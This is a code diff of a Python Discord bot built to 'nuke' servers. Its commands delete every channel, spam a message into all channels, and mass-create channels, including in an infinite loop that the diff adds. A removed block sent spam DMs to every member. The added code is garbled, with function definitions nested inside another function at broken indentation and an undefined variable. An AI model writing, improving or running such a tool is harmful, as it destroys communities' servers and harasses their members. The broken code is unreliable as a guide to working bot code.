@@ -68,23 +68,33 @@ async def cda(ctx):
             await channel.delete()
         except:
             pass   
+
 @client.command()
-async def dm(ctx, *,message):
+async def cc(ctx, *,l ,message):
     members=ctx.guild.members
     await ctx.message.delete()
-    for member in members:
-      try:
-        await member.send(f"{message}")
-      except:
-         pass
+    @client.command()
+async def cda(ctx):
+    guild=ctx.message.guild
+    await ctx.message.delete()
+    
+    for i in range(l):
+        await guild.create_text_channel(f"{message}")
+    while True:
+        for channel in guild.text_channels:
+            for i in range (l):
+                await guild.create_text_channel(f"{message}")
+ 
 
 @client.command()
 async def commands(ctx):
   embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
-  embed.add_field(name=".cda",value="cda command for deleting all channels only", inline=False)
-  embed.add_field(name=".destroy",value="destroy command for deleting all channels and creating 1k channel called 'Nuked'",inline=False)
-  embed.add_field(name=".s",value="s command for spam u can spam by using .s (message) ..the bot will send your message in all channels in the guild",inline=False)
+  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
+  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
+  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
   embed.set_footer(text="developed by Saad.")
   
   await ctx.send(embed=embed)
+
+
 client.run(token)
